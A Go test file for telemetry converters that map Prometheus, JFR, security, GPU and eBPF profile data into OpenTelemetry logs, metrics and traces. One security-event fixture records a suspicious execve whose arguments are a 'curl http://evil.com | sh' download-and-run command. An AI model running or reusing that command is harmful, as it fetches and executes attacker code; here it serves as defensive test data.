package converters

import (
	"context"
	"testing"
	"time"
)

func TestPrometheusConverterCounter(t *testing.T) {
	conv := NewPrometheusConverter()

	families := []*PrometheusMetricFamily{
		{
			Name: "http_requests_total",
			Help: "Total HTTP requests",
			Type: PrometheusTypeCounter,
			Metrics: []PrometheusMetric{
				{
					Labels:    map[string]string{"method": "GET", "status": "200"},
					Value:     1234,
					Timestamp: time.Now(),
				},
				{
					Labels:    map[string]string{"method": "POST", "status": "201"},
					Value:     567,
					Timestamp: time.Now(),
				},
			},
		},
	}

	metrics, err := conv.ConvertMetrics(context.Background(), families)
	if err != nil {
		t.Fatalf("ConvertMetrics failed: %v", err)
	}

	if metrics.ResourceMetrics().Len() != 1 {
		t.Errorf("expected 1 resource metrics, got %d", metrics.ResourceMetrics().Len())
	}

	sm := metrics.ResourceMetrics().At(0).ScopeMetrics().At(0)
	if sm.Metrics().Len() != 1 {
		t.Errorf("expected 1 metric, got %d", sm.Metrics().Len())
	}

	m := sm.Metrics().At(0)
	if m.Name() != "http.requests" { // normalized name
		t.Errorf("expected name 'http.requests', got '%s'", m.Name())
	}

	sum := m.Sum()
	if !sum.IsMonotonic() {
		t.Error("counter should be monotonic")
	}
	if sum.DataPoints().Len() != 2 {
		t.Errorf("expected 2 data points, got %d", sum.DataPoints().Len())
	}
}

func TestPrometheusConverterGauge(t *testing.T) {
	conv := NewPrometheusConverter()

	families := []*PrometheusMetricFamily{
		{
			Name: "process_memory_bytes",
			Help: "Process memory usage",
			Type: PrometheusTypeGauge,
			Metrics: []PrometheusMetric{
				{
					Labels:    map[string]string{"pid": "1234"},
					Value:     1024 * 1024 * 100,
					Timestamp: time.Now(),
				},
			},
		},
	}

	metrics, err := conv.ConvertMetrics(context.Background(), families)
	if err != nil {
		t.Fatalf("ConvertMetrics failed: %v", err)
	}

	sm := metrics.ResourceMetrics().At(0).ScopeMetrics().At(0)
	m := sm.Metrics().At(0)
	
	gauge := m.Gauge()
	if gauge.DataPoints().Len() != 1 {
		t.Errorf("expected 1 data point, got %d", gauge.DataPoints().Len())
	}

	dp := gauge.DataPoints().At(0)
	if dp.DoubleValue() != 1024*1024*100 {
		t.Errorf("expected value 104857600, got %f", dp.DoubleValue())
	}
}

func TestPrometheusTextParsing(t *testing.T) {
	text := `# HELP http_requests_total Total HTTP requests
# TYPE http_requests_total counter
http_requests_total{method="GET",status="200"} 1234
http_requests_total{method="POST",status="201"} 567
# HELP process_cpu_seconds_total Total CPU seconds
# TYPE process_cpu_seconds_total counter
process_cpu_seconds_total 123.45
`

	families, err := ParsePrometheusText(text)
	if err != nil {
		t.Fatalf("ParsePrometheusText failed: %v", err)
	}

	if len(families) != 2 {
		t.Errorf("expected 2 families, got %d", len(families))
	}

	var httpFamily *PrometheusMetricFamily
	for _, f := range families {
		if f.Name == "http_requests_total" {
			httpFamily = f
			break
		}
	}

	if httpFamily == nil {
		t.Fatal("http_requests_total family not found")
	}

	if len(httpFamily.Metrics) != 2 {
		t.Errorf("expected 2 metrics, got %d", len(httpFamily.Metrics))
	}

	if httpFamily.Type != PrometheusTypeCounter {
		t.Errorf("expected counter type, got %v", httpFamily.Type)
	}
}

func TestJFRConverterLogs(t *testing.T) {
	conv := NewJFRConverter()

	recording := &JFRRecording{
		Events: []JFREvent{
			{
				Type:      "jdk.GarbageCollection",
				StartTime: time.Now(),
				Duration:  50 * time.Millisecond,
				Thread:    &JFRThread{Name: "GC Thread", ID: 1},
				Fields: map[string]interface{}{
					"gcId":  1,
					"cause": "System.gc()",
				},
			},
			{
				Type:      "jdk.CPULoad",
				StartTime: time.Now(),
				Fields: map[string]interface{}{
					"jvmUser":   0.25,
					"jvmSystem": 0.10,
				},
			},
		},
		Metadata: &JFRMetadata{
			StartTime:  time.Now().Add(-time.Minute),
			EndTime:    time.Now(),
			JVMName:    "OpenJDK 64-Bit Server VM",
			JVMVersion: "17.0.1",
			PID:        12345,
		},
	}

	logs, err := conv.ConvertLogs(context.Background(), recording)
	if err != nil {
		t.Fatalf("ConvertLogs failed: %v", err)
	}

	if logs.ResourceLogs().Len() != 1 {
		t.Errorf("expected 1 resource logs, got %d", logs.ResourceLogs().Len())
	}

	sl := logs.ResourceLogs().At(0).ScopeLogs().At(0)
	if sl.LogRecords().Len() != 2 {
		t.Errorf("expected 2 log records, got %d", sl.LogRecords().Len())
	}

	// Check GC event.
	gcLog := sl.LogRecords().At(0)
	eventType, _ := gcLog.Attributes().Get("jfr.event.type")
	if eventType.Str() != "jdk.GarbageCollection" {
		t.Errorf("expected GC event type, got %s", eventType.Str())
	}
}

func TestJFRConverterMetrics(t *testing.T) {
	conv := NewJFRConverter()

	recording := &JFRRecording{
		Events: []JFREvent{
			{Type: "jdk.GarbageCollection", StartTime: time.Now(), Duration: 50 * time.Millisecond},
			{Type: "jdk.GarbageCollection", StartTime: time.Now(), Duration: 30 * time.Millisecond},
			{
				Type:      "jdk.CPULoad",
				StartTime: time.Now(),
				Fields:    map[string]interface{}{"jvmUser": 0.25, "jvmSystem": 0.10},
			},
		},
	}

	metrics, err := conv.ConvertMetrics(context.Background(), recording)
	if err != nil {
		t.Fatalf("ConvertMetrics failed: %v", err)
	}

	sm := metrics.ResourceMetrics().At(0).ScopeMetrics().At(0)
	if sm.Metrics().Len() < 2 {
		t.Errorf("expected at least 2 metrics, got %d", sm.Metrics().Len())
	}
}

func TestSecurityConverterLogs(t *testing.T) {
	conv := NewSecurityConverter()

	batch := &SecurityEventBatch{
		Events: []SecurityEvent{
			{
				Type:      SecurityEventExecve,
				Timestamp: time.Now(),
				Severity:  SecuritySeverityHigh,
				Process: &ProcessInfo{
					PID:  1234,
					PPID: 1,
					Comm: "malicious",
					Exe:  "/tmp/malicious",
				},
				Details: map[string]interface{}{
					"args": []string{"-c", "curl http://evil.com | sh"},
				},
				RuleID:   "EXEC-001",
				RuleName: "Suspicious execve",
			},
		},
		HostInfo: &HostInfo{
			Hostname: "node-1",
			Kernel:   "5.15.0",
		},
	}

	logs, err := conv.ConvertLogs(context.Background(), batch)
	if err != nil {
		t.Fatalf("ConvertLogs failed: %v", err)
	}

	lr := logs.ResourceLogs().At(0).ScopeLogs().At(0).LogRecords().At(0)

	// Check severity.
	if lr.SeverityText() != string(SecuritySeverityHigh) {
		t.Errorf("expected severity 'high', got '%s'", lr.SeverityText())
	}

	// Check attributes.
	eventType, _ := lr.Attributes().Get("security.event.type")
	if eventType.Str() != string(SecurityEventExecve) {
		t.Errorf("expected event type 'execve', got '%s'", eventType.Str())
	}

	pid, _ := lr.Attributes().Get("process.pid")
	if pid.Int() != 1234 {
		t.Errorf("expected pid 1234, got %d", pid.Int())
	}
}

func TestSecurityConverterMetrics(t *testing.T) {
	conv := NewSecurityConverter()

	batch := &SecurityEventBatch{
		Events: []SecurityEvent{
			{Type: SecurityEventExecve, Severity: SecuritySeverityHigh, Timestamp: time.Now()},
			{Type: SecurityEventExecve, Severity: SecuritySeverityMedium, Timestamp: time.Now()},
			{Type: SecurityEventFileModify, Severity: SecuritySeverityLow, Timestamp: time.Now()},
		},
	}

	metrics, err := conv.ConvertMetrics(context.Background(), batch)
	if err != nil {
		t.Fatalf("ConvertMetrics failed: %v", err)
	}

	sm := metrics.ResourceMetrics().At(0).ScopeMetrics().At(0)
	if sm.Metrics().Len() != 3 { // by_type, by_severity, by_category
		t.Errorf("expected 3 metrics, got %d", sm.Metrics().Len())
	}
}

func TestGPUConverterTraces(t *testing.T) {
	conv := NewGPUConverter()

	batch := &GPUEventBatch{
		Events: []GPUEvent{
			{
				Type:      GPUEventKernelLaunch,
				Timestamp: time.Now(),
				Duration:  time.Millisecond,
				DeviceID:  0,
				Process:   &GPUProcessInfo{PID: 1234, Comm: "pytorch"},
				Details: map[string]interface{}{
					"kernelName": "matmul_kernel",
					"gridDim":    []int{128, 1, 1},
					"blockDim":   []int{256, 1, 1},
				},
			},
		},
		DeviceInfo: []GPUDeviceInfo{
			{DeviceID: 0, Name: "NVIDIA A100", Memory: 40 * 1024 * 1024 * 1024},
		},
	}

	traces, err := conv.ConvertTraces(context.Background(), batch)
	if err != nil {
		t.Fatalf("ConvertTraces failed: %v", err)
	}

	span := traces.ResourceSpans().At(0).ScopeSpans().At(0).Spans().At(0)
	if span.Name() != string(GPUEventKernelLaunch) {
		t.Errorf("expected span name '%s', got '%s'", GPUEventKernelLaunch, span.Name())
	}

	kernelName, _ := span.Attributes().Get("gpu.kernel.name")
	if kernelName.Str() != "matmul_kernel" {
		t.Errorf("expected kernel name 'matmul_kernel', got '%s'", kernelName.Str())
	}
}

func TestGPUConverterMetrics(t *testing.T) {
	conv := NewGPUConverter()

	batch := &GPUEventBatch{
		Events: []GPUEvent{
			{Type: GPUEventKernelLaunch, DeviceID: 0, Duration: time.Millisecond, Timestamp: time.Now()},
			{Type: GPUEventKernelLaunch, DeviceID: 0, Duration: 2 * time.Millisecond, Timestamp: time.Now()},
			{Type: GPUEventMemcpyHtoD, DeviceID: 0, Timestamp: time.Now(), Details: map[string]interface{}{"size": float64(1024)}},
		},
	}

	metrics, err := conv.ConvertMetrics(context.Background(), batch)
	if err != nil {
		t.Fatalf("ConvertMetrics failed: %v", err)
	}

	sm := metrics.ResourceMetrics().At(0).ScopeMetrics().At(0)
	if sm.Metrics().Len() < 2 {
		t.Errorf("expected at least 2 metrics, got %d", sm.Metrics().Len())
	}
}

func TestEBPFProfileConverterLogs(t *testing.T) {
	conv := NewEBPFProfileConverter()

	batch := &ProfileBatch{
		Profiles: []ProfileData{
			{
				Type:       ProfileTypeCPU,
				StartTime:  time.Now().Add(-time.Minute),
				EndTime:    time.Now(),
				Duration:   time.Minute,
				SampleRate: 99,
				Process: &ProfiledProcess{
					PID:  1234,
					Comm: "myapp",
					Exe:  "/usr/bin/myapp",
				},
				Samples: []ProfileSample{
					{
						Timestamp: time.Now(),
						Value:     10,
						StackTrace: []StackFrame{
							{Address: 0x1234, Symbol: "main.compute", Module: "myapp"},
							{Address: 0x1235, Symbol: "main.main", Module: "myapp"},
						},
					},
				},
			},
		},
		HostInfo: &ProfileHostInfo{
			Hostname: "worker-1",
			CPUCount: 8,
		},
	}

	logs, err := conv.ConvertLogs(context.Background(), batch)
	if err != nil {
		t.Fatalf("ConvertLogs failed: %v", err)
	}

	lr := logs.ResourceLogs().At(0).ScopeLogs().At(0).LogRecords().At(0)

	profileType, _ := lr.Attributes().Get("profile.type")
	if profileType.Str() != string(ProfileTypeCPU) {
		t.Errorf("expected profile type 'cpu', got '%s'", profileType.Str())
	}

	sampleCount, _ := lr.Attributes().Get("profile.sample_count")
	if sampleCount.Int() != 1 {
		t.Errorf("expected 1 sample, got %d", sampleCount.Int())
	}
}

func TestEBPFProfileConverterMetrics(t *testing.T) {
	conv := NewEBPFProfileConverter()

	batch := &ProfileBatch{
		Profiles: []ProfileData{
			{
				Type:      ProfileTypeCPU,
				StartTime: time.Now().Add(-time.Minute),
				EndTime:   time.Now(),
				Process:   &ProfiledProcess{PID: 1234, Comm: "myapp"},
				Samples: []ProfileSample{
					{Value: 100},
					{Value: 200},
				},
			},
			{
				Type:      ProfileTypeMemory,
				StartTime: time.Now().Add(-time.Minute),
				EndTime:   time.Now(),
				Process:   &ProfiledProcess{PID: 1234, Comm: "myapp"},
				Samples: []ProfileSample{
					{Value: 1024},
					{Value: 2048},
				},
			},
		},
	}

	metrics, err := conv.ConvertMetrics(context.Background(), batch)
	if err != nil {
		t.Fatalf("ConvertMetrics failed: %v", err)
	}

	sm := metrics.ResourceMetrics().At(0).ScopeMetrics().At(0)
	if sm.Metrics().Len() != 2 { // cpu samples + memory allocated
		t.Errorf("expected 2 metrics, got %d", sm.Metrics().Len())
	}
}

func TestResourceBuilder(t *testing.T) {
	rb := NewResourceBuilder()
	res := rb.
		SetServiceName("test-service").
		SetServiceNamespace("production").
		SetHostName("host-1").
		SetAttribute("custom.key", "custom-value").
		Build()

	serviceName, ok := res.Attributes().Get("service.name")
	if !ok || serviceName.Str() != "test-service" {
		t.Error("service.name not set correctly")
	}

	namespace, ok := res.Attributes().Get("service.namespace")
	if !ok || namespace.Str() != "production" {
		t.Error("service.namespace not set correctly")
	}

	customAttr, ok := res.Attributes().Get("custom.key")
	if !ok || customAttr.Str() != "custom-value" {
		t.Error("custom.key not set correctly")
	}
}

func TestSeverityFromLevel(t *testing.T) {
	testCases := []struct {
		level    string
		expected string
	}{
		{"INFO", "Info"},
		{"info", "Info"},
		{"ERROR", "Error"},
		{"WARN", "Warn"},
		{"DEBUG", "Debug"},
		{"FATAL", "Fatal"},
		{"unknown", "Unspecified"},
	}

	for _, tc := range testCases {
		sev := SeverityFromLevel(tc.level)
		if sev.String() != tc.expected {
			t.Errorf("SeverityFromLevel(%s) = %s, expected %s", tc.level, sev.String(), tc.expected)
		}
	}
}
